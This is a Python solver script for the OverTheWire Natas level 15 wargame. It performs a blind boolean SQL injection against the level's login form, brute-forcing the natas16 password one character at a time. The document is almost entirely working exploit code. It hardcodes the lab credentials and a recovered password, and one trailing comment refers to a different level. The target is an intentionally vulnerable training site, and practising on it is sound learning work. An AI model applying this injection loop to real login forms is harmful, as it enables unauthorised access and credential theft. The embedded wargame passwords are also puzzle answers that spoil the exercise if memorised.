#! /usr/bin/python


import requests


#Functions
def cleanheaders(headers):
	for item in headers:
		value=headers.get(item,'Not Found')
		print(f'{item} : {value}')


#Basic Authentication
basic_username,basic_password='natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'.split(':')


#Website Details
host=f'http://{basic_username}.natas.labs.overthewire.org'
path=''

#Custom Headers
custom_headers=''
lower='abcdefghijklmnopqrstuvwyxz'
upper=lower.upper()
digits='1234567890'
allchars=lower+upper+digits



failed="This user doesn't exist"
passed='This user exists'




final=''
index=0
while len(final) < 40:
	word=final+allchars[index]
	print(f'[-] Trying {word}\t\t\t\t\tcurrent:{final}\t\tlength:{len(final)}')
	user=f'" or username="natas16" and  password like BINARY "{word}%" -- ##'
	#Payload
	payload={"username":user}

	url=host+path
	session=requests.Session()
	response=requests.post(url,data=payload,auth=(basic_username,basic_password))
	content=response.text
	status=response.status_code
	headers=response.headers

	if passed in content:
		#Add to string and Reset index
		final+=allchars[index] # Adding the next letter
		index=0 #Resetting the index to the first character or to the first index

		print(f'[+] {final}')
	if failed in content:
		index+=1 #Moves to the  next letter
		pass


	# flag=content
	# print(flag)


#WRITEUP
#The flag was in the source of the index.html page but this time right clicking is blocked
# HLwuGKts

# natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
